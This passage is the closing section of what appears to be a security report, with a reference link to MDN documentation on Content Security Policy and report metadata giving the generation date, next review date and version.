- **Content Security Policy:** https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP

---

**Report Generated:** 2025-10-24
**Next Review Recommended:** 2025-11-24 (30 days)
**Version:** 1.0
